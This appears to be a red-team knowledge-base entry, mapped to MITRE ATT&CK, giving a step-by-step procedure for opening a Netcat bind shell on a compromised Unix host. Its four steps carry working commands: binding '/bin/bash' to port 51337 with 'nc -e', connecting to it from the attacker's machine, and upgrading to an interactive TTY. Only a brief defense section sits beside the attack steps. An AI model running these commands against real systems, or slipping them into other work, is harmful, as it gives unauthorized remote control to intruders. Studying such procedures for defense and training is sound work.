---
type: procedure
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command and Scripting Interpreter|T1059.003 - Unix Shell]]'
  - '[[techniques/Ingress Tool Transfer|T1105 - Ingress Tool Transfer]]'
sub_techniques: []
tags:
  - '[[tags/Bind Shell]]'
  - '[[tags/Netcat Traditional]]'
commands:
  - '[[commands/netcat-bind-shell-listener]]'
  - '[[commands/netcat-connect-to-bind-shell]]'
platforms:
  - Linux
  - Unix
tools:
  - '[[tools/Netcat]]'
skill_level: beginner
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Netcat-Traditional-Bind-Shell

## Summary

This procedure demonstrates how to establish a traditional bind shell using Netcat (nc) on a compromised Unix-like target system. A bind shell opens a listening port on the target and executes a shell (e.g., /bin/bash) when an incoming connection is made from the attacker's machine, providing remote command execution and control.

## Description

In a bind shell scenario, the target machine acts as the server, binding to a specified port and waiting for the attacker to connect. Upon connection, Netcat executes the designated shell, allowing the attacker to send commands over the network connection. This technique is commonly used in post-exploitation phases for maintaining access, lateral movement, or data exfiltration on Unix-based systems. It requires command execution privileges on the target and an open port (not blocked by firewalls). Netcat's traditional version supports the -e option for program execution, which is key to spawning the shell. This method uses raw TCP for communication, making it stealthy but detectable via network monitoring.

## Requirements

1. Netcat traditional version installed on the target system (with -e support; OpenBSD netcat lacks this).
2. Command execution access on the target (e.g., via initial RCE or compromised credentials).
3. A free port on the target (e.g., above 1024 to avoid root privileges; port 51337 used here).
4. Network connectivity from attacker to target port (no inbound firewall blocks).
5. Netcat or compatible tool on the attacker's machine for connecting.

## Defense

- Configure host firewalls (e.g., iptables, ufw) to block inbound connections on non-essential ports.
- Monitor network traffic for unusual inbound connections to high ports using tools like Snort or host-based IDS.
- Enable process monitoring to detect suspicious executions of nc or bash spawned from network processes.
- Use application whitelisting to restrict execution of networking tools like Netcat.
- Log and alert on anomalous shell processes bound to network sockets.

## Objectives

1. Bind a shell listener on the target machine to accept incoming connections.
2. Connect from the attacker machine to gain interactive remote shell access.
3. Execute commands on the target for persistence, reconnaissance, or further exploitation.
4. Maintain control over the target system via the established connection.

## Instructions

### Step 1: Verify Netcat Availability and Select Port

**Context**: Confirm that the traditional Netcat is available on the target and choose an unused port to avoid conflicts. This step ensures the tool supports the -e flag for shell execution.

Run a basic check using [[commands/netcat-bind-shell-listener]] with a test to verify functionality.

**Command** ([[commands/netcat-bind-shell-listener]]):
```bash
nc -nlvp 51337 -e /bin/bash
```

> This command sets up the listener but will be interrupted for testing. Expected output includes verbose messages like "Listening on [0.0.0.0] (family 0, port 51337)". If -e is unsupported, fall back to piping methods (e.g., nc | /bin/bash).

### Step 2: Execute Bind Shell on Target

**Context**: Once verified, deploy the bind shell listener on the target. This opens the port and prepares to spawn a bash shell upon connection, achieving remote access.

Execute the full bind shell command on the target using existing access (e.g., via SSH or prior RCE).

**Command** ([[commands/netcat-bind-shell-listener]]):
```bash
nc -nlvp 51337 -e /bin/bash
```

> The target will display "listening on [any] 51337 ..." and wait. Success is indicated by no errors and the process binding to the port (check with `netstat -tlnp | grep 51337`).

### Step 3: Connect from Attacker Machine

**Context**: From the attacker's controlled machine, connect to the target's listening port to activate the shell and gain interactive control.

Use Netcat to connect to the target's IP and port.

**Command** ([[commands/netcat-connect-to-bind-shell]]):
```bash
nc $_TARGET_IP 51337
```

> Upon connection, the target's shell spawns, and the attacker sees a bash prompt. Type commands like `whoami` or `id` to verify access. Expected output: Interactive shell response to commands.

### Step 4: Verify and Stabilize Connection

**Context**: Test the shell for functionality and upgrade if needed (e.g., to a fully interactive TTY using Python or script).

From the connected shell, run basic commands to confirm control.

**Command** (inline verification):
```bash
whoami; id; pwd
```

> Expected output: User details, UID/GID, and current directory. If the shell is semi-interactive, upgrade with `python -c 'import pty; pty.spawn("/bin/bash")'` for better usability.
